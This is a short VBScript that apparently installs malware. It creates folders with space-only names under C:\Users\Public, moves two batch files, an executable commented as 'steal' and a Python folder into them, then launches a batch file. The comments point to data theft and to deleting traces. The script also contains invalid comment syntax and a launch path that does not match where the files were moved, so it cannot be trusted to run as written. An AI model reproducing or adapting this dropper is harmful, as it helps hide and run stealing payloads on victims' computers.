DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )

SET FSO=CreateObject("Scripting.FileSystemObject")
FSO.CreateFolder("C:\Users\Public\ \")
FSO.CreateFolder("C:\Users\Public\ \ \")

FSO.Movefile "file\a.bat","C:\Users\Public\ \ " ` run
FSO.Movefile "file\b.bat","C:\Users\Public\ \ " ` file | del
FSO.Movefile "file\file.exe","C:\Users\Public\ \ " ` file | steal
FSO.Movefolder "file\pyC\","C:\Users\Public\ \ \" ` pythoniC

CreateObject("Wscript.Shell").Run """C:\Users\Public\a.bat""", 1, True
